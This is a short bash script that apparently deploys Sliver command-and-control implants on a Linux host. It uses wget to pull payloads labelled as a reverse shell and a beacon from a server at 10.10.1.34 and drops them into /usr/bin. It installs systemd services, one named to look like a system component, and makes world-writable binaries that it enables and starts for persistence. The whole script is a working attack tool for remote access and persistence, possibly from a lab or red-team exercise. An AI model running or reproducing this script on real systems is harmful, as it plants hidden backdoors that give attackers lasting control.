#!/bin/bash

#Rev shell
wget 10.10.1.34/Beachhead_source/sliverPayloads/BEAUTIFUL_APPLAUSE -O /usr/bin/start
wget 10.10.1.34/Services/worker.service -O /etc/systemd/system/worker.service

#Beacon
wget 10.10.1.34/Beachhead_source/sliverPayloads/BEAUTIFUL_APPLAUSE -O /usr/bin/sys
wget 10.10.1.34/Services/systemd-ini.service -O /etc/systemd/system/systemd-ini.service

chmod 777 /usr/bin/start
chmod 777 /usr/bin/sys

sleep 5
systemctl enable worker
systemctl start worker

sleep 5
systemctl enable systemd-ini
systemctl start systemd-ini